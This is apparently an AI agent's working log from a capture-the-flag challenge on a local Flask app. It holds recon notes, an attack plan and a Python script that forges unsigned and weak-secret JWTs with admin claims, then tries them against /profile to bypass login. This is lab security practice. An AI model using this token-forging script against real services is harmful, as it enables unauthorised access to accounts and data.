SURFACE: GET / -> 302 /login; GET/POST /login form fields username,password; GET /profile redirects unauthenticated to /login; common probes /robots.txt /api /admin /debug /healthz /login.php /register /flag /jwt /.git/HEAD /sitemap.xml return generic 404. BUG-HYP: JWT auth flaw at authentication boundary: /login may issue a JWT/session credential and /profile likely gates flag/admin data based on token claims; evidence is category=jwt, Werkzeug Flask stack, /login form, /profile protected redirect. WHY: Iter3 headers show Werkzeug/3.0.3 Python/3.8.17; /login served a POST form; /profile unauthenticated 302 to /login; route inventory so far has no source or public flag endpoints. PLAN: - HYPOTHESIS: login issues a JWT with forgeable/weak/misvalidated signature/claims (evidence: category jwt + Flask login/profile auth flow). - ATTACK CHAIN: enumerate form behavior and credentials/defaults -> obtain any token/session -> decode/fingerprint JWT -> test authz claims/signature acceptance/weak key -> request /profile or hidden admin endpoint -> flag. - FIRST PROBE: reach-fuzz forms --base http://127.0.0.1:9140 ; then baseline POST /login with common creds and inspect Set-Cookie/redirect/body. - ABANDON IF: no token/cookie/JWT appears from login and route fuzzing finds a different live oracle/endpoints indicating non-JWT path. EOF python3 - <<'PY' import base64,json,requests,hashlib,hmac,hashlib as hl base='http://127.0.0.1:9140' def b64(o): data=json.dumps(o,separators=(',',':')).encode() return base64.urlsafe_b64encode(data).rstrip(b'=').decode() def token(payload,alg='none',secret=''): header={'typ':'JWT','alg':alg} signing=b64(header)+'.'+b64(payload) if alg=='none': return signing+'.' sig=hmac.new(secret.encode(),signing.encode(),hl.sha256).digest() return signing+'.'+base64.urlsafe_b64encode(sig).rstrip(b'=').decode() payloads=[ {'username':'admin'}, {'user':'admin'}, {'sub':'admin'}, {'name':'admin'}, {'username':'admin','role':'admin'}, {'username':'admin','is_admin':True}, {'username':'admin','admin':True}, {'identity':'admin'}, {'id':1,'username':'admin','role':'admin'}] tokens=[('malformed','abc.def.ghi')] for i,p in enumerate(payloads): tokens.append((f'none{i}',token(p,'none'))) # a couple HS256 common secrets in case parser expects signed but known secret for sec in ['secret','jwt-secret','supersecret','key','changeme','admin','flask_secret_key','your-256-bit-secret']: tokens.append((f'hs_secret_{sec}',token({'username':'admin','role':'admin','admin':True,'is_admin':True},'HS256',sec))) transports=[] for name,tok in tokens[:]: transports.append((name,'Authorization',{'Authorization':'Bearer '+tok},{})) for cname in ['token','jwt','access_token','auth','authorization','session']: transports.append((name,cname,{}, {cname:tok})) seen={} for name,tr,headers,cookies in transports: r=requests.get(base+'/profile',headers=headers,cookies=cookies,timeout=5,allow_redirects=False) sig=(r.status_code,len(r.content),hashlib.sha256(r.content).hexdigest()[:10],r.headers.get('Location',''),r.headers.get('Content-Type','')) # print all non-baseline redirects or first few for baseline key=sig if sig not in seen: seen[sig]=[(name,tr,r.text)] else: seen[sig].append((name,tr,r.text)) for sig,items in seen.items(): print('=== SIG',sig,'COUNT',len(items),'EXAMPLES',items[:5],'===') print(items[0][2]) PY STATE (iter 6): - CONFIRMED: only live routes discovered are /login and /profile; OPTIONS confirms methods GET/POST for /login, GET for /profile. - REFUTED: broad common path list did not reveal admin/api/token/protected/dashboard/static JS routes. - OPEN: P1 /profile accepts a JWT in cookie/header but login remains unavailable; P2 login injection/credential discovery; P3 route hidden by host/path not in common list. - NEXT: empirically fingerprint /profile token transport/names and JWT parser behavior using malformed and alg=none tokens.
